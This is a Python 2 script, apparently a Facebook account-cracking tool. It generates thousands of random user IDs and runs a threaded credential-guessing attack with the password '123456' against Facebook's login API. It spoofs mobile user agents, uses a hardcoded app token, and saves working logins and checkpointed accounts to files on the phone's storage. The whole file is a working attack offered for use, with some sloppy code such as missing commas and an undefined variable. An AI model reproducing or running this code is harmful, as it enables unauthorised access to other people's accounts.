#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
os.system('rm -rf .txt')
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
for n in range(20000):
    nmbr = random.randint(111111,999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

reload(sys)
sys.setdefaultencoding('utf8')
from multiprocessing.pool import ThreadPool

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
os.system('xdg-open https://youtube.com/channel/UCoCVfFSoXWVF6_lIPUSMu1w')
sua = [
'Mozilla/5.0 (Linux; Android 11; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Mobile/15E148 Safari/604.1;]'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.2214.111 Adventurer/3.1.0.3 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4690.4 Safari/537.36 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4701.0 Safari/537.36 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4701.0 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4694.2 Safari/537.36'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4662.6 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4682.3 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4692.36 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4736.0 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]',
'Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
'Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4855.0 Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3'
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',] 
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4) 
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3', 'x-fb-connection-type': 'unknown', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = """
\x1b[1;92m _______   ________  __     __  ______  __       
/       \ /        |/  |   /  |/      |/  |      
$$$$$$$  |$$$$$$$$/ $$ |   $$ |$$$$$$/ $$ |      
$$ |  $$ |$$ |__    $$ |   $$ |  $$ |  $$ |      
$$ |  $$ |$$    |   $$  \ /$$/   $$ |  $$ |    \x1b[1;91m  
$$ |  $$ |$$$$$/     $$  /$$/    $$ |  $$ |      
$$ |__$$ |$$ |_____   $$ $$/    _$$ |_ $$ |_____ 
$$    $$/ $$       |   $$$/    / $$   |$$       |
$$$$$$$/  $$$$$$$$/     $/     $$$$$$/ $$$$$$$$/ 
"""
os.system('clear')
print logo
print 48 * '\x1b[1;91m~'
def ran():
    id=[]
    cps=[]
    oks=[]
    os.system("clear")
    print(logo)
    print("")
    print("")
    k = '1'
    try:
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())
    except:
        exit(" An error has occured")
    os.system("clear")
    print logo
    print 48 * '\x1b[1;91m~'
    print('\x1b[1;91m   USE (MOBILE DATA) BEFORE USE')
    print 48 * '\x1b[1;91m~'
    xxx = str(len(id))
    print('\x1b[1;92m   TOTAL IDS :\x1b[1;92m ' + xxx)
    print('\x1b[1;92m   UID ACCOUNT CRACKING STARTED....')
    print 48 * '\x1b[1;91m~'
    os.system('xdg-open  https://facebook.com/groups/3161198854092643/')
    def main(arg):
        user=arg
        sharagent = random.choice(sua)
        ses = requests.Session()
        ses.headers.update({'User-Agent': sharagent})
        try:
            pass1 = '123456'
            data = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+user+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
            s = json.loads(data)
            if "access_token" in s:
                print('\033[1;92m[OK] '+k+user+' | '+pass1+'\033[1;92m')
                ok = open('/sdcard/DV_OK.txt', 'a')
                ok.write(k+user+'|'+pass1+'\n')
                ok.close()
                oks.append(c + user + pass1)
            else:
                if "www.facebook.com" in s["error_msg"]:
                    print(' \x1b[1;91m [CP] '+k+user+' | '+pass1+'\033[1;91m')
                    cp = open('/sdcard/DV_CP.txt', 'a')
                    cp.write(k+user+'|'+pass1+'\n')
                    cp.close()
                    cps.append(c + user + pass1)
                
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print ("\x1b[1;91m[!]\x1b[1;97m Process has been complete")
    print ("\x1b[1;92m[!]\x1b[1;92m Total OK  "+str(len(oks)))
    print ("\x1b[1;91m[!]\x1b[1;91m Total CP  "+str(len(cps)))
    raw_input("\x1b[1;97m Press enter to back Menu ")
    ran()
    
ran()
